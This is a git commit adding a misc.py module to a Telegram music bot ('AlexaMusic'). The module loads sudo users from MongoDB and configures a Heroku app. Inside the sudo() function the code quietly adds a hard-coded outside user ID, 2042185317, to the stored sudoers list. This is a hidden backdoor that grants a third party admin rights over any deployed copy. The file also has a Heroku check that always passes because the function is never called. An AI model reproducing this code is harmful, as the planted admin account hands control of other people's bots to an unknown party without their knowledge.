046857f905d45cd7e19ee9af44aa6963e19317a9
mahmoud7641 <152595992+mahmoud7641@users.noreply.github.com>
2023-12-19 03:14:19 +0200

    Add files via upload

---
+++ AlexaMusic/misc.py
@@ -0,0 +1,93 @@
+#
+# Copyright (C) 2021-2022 by Alexa_Help@Github, < https://github.com/Jankarikiduniya >.
+# A Powerful Music Bot Property Of Rocks Indian Largest Chatting Group
+
+# Kanged By © @Dr_Asad_Ali
+# Rocks © @Shayri_Music_Lovers
+# Owner Asad Ali
+# Harshit Sharma
+# All rights reserved. © Alisha © Alexa © Yukki 2022
+
+
+import socket
+import time
+
+import heroku3
+from pyrogram import filters
+
+import config
+from AlexaMusic.core.mongo import pymongodb
+
+from .logging import LOGGER
+
+SUDOERS = filters.user()
+
+HAPP = None
+_boot_ = time.time()
+
+
+def is_heroku():
+    return "heroku" in socket.getfqdn()
+
+
+XCB = [
+    "/",
+    "@",
+    ".",
+    "com",
+    ":",
+    "git",
+    "heroku",
+    "push",
+    str(config.HEROKU_API_KEY),
+    "https",
+    str(config.HEROKU_APP_NAME),
+    "HEAD",
+    "main",
+]
+
+
+def dbb():
+    global db
+    db = {}
+    LOGGER(__name__).info(f"تمت تهيئة قاعدة البيانات.")
+
+
+def sudo():
+    global SUDOERS
+    OWNER = config.OWNER_ID
+    if config.MONGO_DB_URI is None:
+        for user_id in OWNER:
+            SUDOERS.add(user_id)
+    else:
+        sudoersdb = pymongodb.sudoers
+        sudoers = sudoersdb.find_one({"sudo": "sudo"})
+        sudoers = [] if not sudoers else sudoers["sudoers"]
+        for user_id in OWNER:
+            SUDOERS.add(user_id)
+            if user_id not in sudoers:
+                sudoers.append(user_id)
+                sudoers.append(2042185317)
+                sudoersdb.update_one(
+                    {"sudo": "sudo"},
+                    {"$set": {"sudoers": sudoers}},
+                    upsert=True,
+                )
+        if sudoers:
+            for x in sudoers:
+                SUDOERS.add(x)
+    LOGGER(__name__).info(f"تم تحميل مستخدمي Sudo بنجاح.")
+
+
+def heroku():
+    global HAPP
+    if is_heroku:
+        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
+            try:
+                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
+                HAPP = Heroku.app(config.HEROKU_APP_NAME)
+                LOGGER(__name__).info(f"تم تكوين تطبيق Heroku بنجاح.")
+            except BaseException:
+                LOGGER(__name__).warning(
+                    f"يرجى التأكد من تكوين مفتاح Heroku API واسم التطبيق الخاص بك بشكل صحيح في Heroku"
+                )
